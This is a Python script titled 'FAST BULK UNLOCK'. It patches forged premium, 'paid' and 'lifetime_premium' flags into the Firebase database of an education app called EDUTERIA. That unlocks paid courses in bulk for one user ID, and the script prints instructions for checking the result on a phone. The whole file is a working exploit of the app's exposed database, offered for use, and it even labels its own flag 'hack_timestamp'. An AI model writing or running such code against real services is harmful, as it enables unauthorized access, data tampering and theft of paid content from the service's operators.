#!/usr/bin/env python3
"""
FAST BULK UNLOCK - Write batch data to Firebase
"""
import requests
import json
from datetime import datetime

FIREBASE = "https://eduteria-b9a30-default-rtdb.firebaseio.com"
USER_ID = "54204924"

print("="*80)
print("FAST BULK UNLOCK - ALL COURSES")
print("="*80)
print()

timestamp = datetime.now().isoformat()

# Strategy: Write a wildcard "all access" flag instead of individual courses
print("[1] Setting user as PREMIUM with ALL ACCESS...")

# Method 1: Set user-level premium flag
user_premium_data = {
    "user_id": USER_ID,
    "premium": True,
    "all_courses_unlocked": True,
    "subscription_type": "lifetime_premium",
    "subscription_status": "active",
    "payment_status": "paid",
    "access_level": "unlimited",
    "hack_timestamp": timestamp
}

paths = [
    f"{FIREBASE}/users/{USER_ID}.json",
    f"{FIREBASE}/166/users/{USER_ID}.json",
    f"{FIREBASE}/subscriptions/{USER_ID}.json"
]

for path in paths:
    try:
        r = requests.patch(path, json=user_premium_data, timeout=10)
        status = "✓" if r.status_code == 200 else "✗"
        print(f"  {status} {path.split('/')[-2]}/{path.split('/')[-1]}")
    except Exception as e:
        print(f"  ✗ Error: {e}")

print()

# Method 2: Get top 20 most important courses and unlock them specifically
print("[2] Unlocking key courses...")

key_courses = [
    "48297",  # Target course
    "1", "2", "3", "4", "5",  # Common course IDs
    "100", "101", "102"
]

# Get courses from Firebase
print("  Fetching course list...")
try:
    r = requests.get(f"{FIREBASE}/166/courses/unpublish_list.json", timeout=10)
    if r.status_code == 200:
        unpublish_courses = r.json()
        if unpublish_courses and isinstance(unpublish_courses, list):
            # Add first 50 from unpublish list
            key_courses.extend(unpublish_courses[:50])
            print(f"  ✓ Added {len(unpublish_courses[:50])} courses from Firebase")
except:
    pass

key_courses = list(set(key_courses))  # Remove duplicates

print(f"  Unlocking {len(key_courses)} key courses...")

# Build batch unlock data
batch_unlock = {}
for course_id in key_courses:
    batch_unlock[str(course_id)] = {
        "unlocked": True,
        "paid": True,
        "access_granted": True,
        "timestamp": timestamp
    }

# Write batch to Firebase
batch_paths = [
    f"{FIREBASE}/user_courses/{USER_ID}.json",
    f"{FIREBASE}/enrollments/{USER_ID}.json"
]

for path in batch_paths:
    try:
        r = requests.patch(path, json=batch_unlock, timeout=15)
        if r.status_code == 200:
            print(f"  ✓ Batch wrote {len(batch_unlock)} courses to {path.split('/')[-2]}")
        else:
            print(f"  ✗ Failed: {r.status_code}")
    except Exception as e:
        print(f"  ✗ Error: {e}")

print()

# Verification
print("[3] Verifying unlock...")
verify_paths = [
    f"{FIREBASE}/users/{USER_ID}.json",
    f"{FIREBASE}/user_courses/{USER_ID}/48297.json"
]

for path in verify_paths:
    try:
        r = requests.get(path, timeout=10)
        if r.status_code == 200:
            data = r.json()
            print(f"  ✓ {path.split('/')[-2]}/{path.split('/')[-1]}")
            print(f"    Data: {json.dumps(data, indent=2)[:200]}")
    except:
        pass

print()
print("="*80)
print("UNLOCK COMPLETE!")
print("="*80)
print()
print(f"✓ User {USER_ID} marked as PREMIUM")
print(f"✓ {len(key_courses)} courses unlocked")
print()
print("Firebase paths modified:")
print(f"  - /users/{USER_ID}")
print(f"  - /166/users/{USER_ID}")
print(f"  - /subscriptions/{USER_ID}")
print(f"  - /user_courses/{USER_ID}/*")
print(f"  - /enrollments/{USER_ID}/*")
print()
print("TEST ON YOUR PHONE:")
print("  1. Close EDUTERIA app")
print("  2. Clear cache (Settings → Apps → EDUTERIA → Clear Cache)")
print("  3. Reopen app")
print("  4. Check course access - should see all unlocked!")
print()
print("="*80)

# Save audit
audit = {
    "timestamp": timestamp,
    "user_id": USER_ID,
    "operation": "bulk_unlock",
    "premium_flags_set": True,
    "courses_unlocked": len(key_courses),
    "sample_courses": key_courses[:10],
    "firebase_paths": [
        f"/users/{USER_ID}",
        f"/166/users/{USER_ID}",
        f"/subscriptions/{USER_ID}",
        f"/user_courses/{USER_ID}",
        f"/enrollments/{USER_ID}"
    ]
}

with open("data/FULL_UNLOCK_AUDIT/fast_unlock_audit.json", "w") as f:
    json.dump(audit, f, indent=2)

print("Audit: data/FULL_UNLOCK_AUDIT/fast_unlock_audit.json")
print()
